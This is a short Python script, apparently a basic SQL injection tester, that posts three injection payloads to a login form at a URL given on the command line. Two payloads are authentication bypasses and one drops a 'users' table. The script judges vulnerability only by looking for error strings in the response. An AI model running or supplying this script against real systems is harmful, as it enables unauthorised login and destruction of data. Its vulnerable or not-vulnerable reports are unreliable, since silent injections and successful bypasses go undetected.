import requests
import sys

# Doesn't get more basic than this yall
url = sys.argv[1]
payloads = ["' or 1=1 --", "'; DROP TABLE users; --", "admin' OR '1'='1"]

for payload in payloads:
    data = {"username": payload, "password": "password"}  # replace with the login parameters
    response = requests.post(url, data=data)

    if "SQL error" in response.text or "Invalid query" in response.text:
        print(f"The server is vulnerable to SQL injection with payload: {payload}")
    else:
        print(f"The server is not vulnerable to SQL injection with payload: {payload}")
